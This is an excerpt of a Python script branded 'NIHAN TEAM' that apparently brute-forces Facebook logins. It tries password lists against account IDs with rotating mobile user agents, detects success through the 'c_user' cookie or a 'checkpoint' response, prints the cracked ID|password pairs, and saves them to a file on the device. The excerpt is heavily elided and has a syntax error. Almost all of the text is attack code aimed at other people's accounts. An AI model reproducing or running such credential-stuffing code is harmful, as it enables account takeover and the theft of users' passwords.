...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> NIHAN TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/NIHAN.txt')
				linex()
				...
				os.system('python NIHAN-KING.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[NIHAN/BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in NIHAN:
				print('\r\r\033[1;31m[NIHAN-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[NIHAN-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/NIHAN -OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in NIHAN:
				...
				print('\r\r\033[1;32m[NIHAN -OK] %s | %s'%(ids,pas)
				open('/sdcard/NIHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in NIHAN:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mNIHAN/ NIHAN\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
...
sec-fetch-user: ?1
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[NIHAN-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[NIHAN-OK] '+cid+' | '+ps+'\33[0;97m')
